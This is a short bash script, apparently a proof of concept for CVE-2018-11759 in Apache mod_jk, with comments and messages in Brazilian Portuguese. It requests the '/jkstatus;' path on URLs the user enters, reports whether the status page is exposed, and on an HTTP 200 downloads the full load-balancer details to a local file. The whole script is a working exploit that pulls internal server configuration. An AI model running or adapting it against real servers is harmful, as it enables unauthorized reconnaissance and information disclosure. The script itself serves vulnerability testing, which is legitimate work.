#!/bin/bash
#	     CVE 2018-11759
# Author: Julio Lira <jul10l1r4@ufrn.edu.br>
# date: 12/07/2018 | MM/DD/YYYY
# License: GNU GPL version 3
# Description: This script was a test for verify if the application is vulnerable at CVE 2018-11759.
# Details: https://jul10l1r4.github.io/artigo/Vulnerabilidade-em-balanceadores-mod_jk-[CVE-2018-11759]/index.html

# Function for save all details of load balancer
_save(){
	# Verify if exists curl in machine
	which curl > /dev/null && \
		# ok or f'ck
		printf "\n Dependencia, curl encontrada...\n" \
		|| printf '\n \033[31mInstale o Curl\033[0m\n';
	# Make a download of details and redirect for directory
	# files_cap/
	echo -e "\033[32m Iniciando download de detalhes do balanceador\033[0m"
	cat <<- EOF > files_cap/$(printf "$1" | cut -d "/" -f 3).data
		$(curl "$1/jkstatus;?mime=prop")
	EOF
	> /dev/null
	# show msg of OK
	printf "\n \033[32mDetalhes salvos em files_cap/$(printf "$1" | cut -d "/" -f 3).data\033[0m\n"
}
# This all is in portugues of brazil, learning or translate for u :)
while read -p "Cole a URL -> " LINE; do
	# Get status response of http and verify
	blob=$(curl -o /dev/null --silent --head --write-out "%{http_code}" "$LINE/jkstatus;" &3>/dev/null)
	echo "Resposta: $blob"
  if [ $blob == 200 ];then
	printf "\n Vulneravel\n Veja: $LINE/jkstatus;\n"
	_save "$LINE"
  elif [ $blob == 302 ] || [ $blob == 401 ];then
	printf "\n Seguro, mas pode sofrer ataque\n brute-force, cuidado\n Veja: $LINE/jkstatus;\n"
  else
	printf "\n Seguro, parabens\n veja: $LINE/jkstatus;\n"
  fi
done

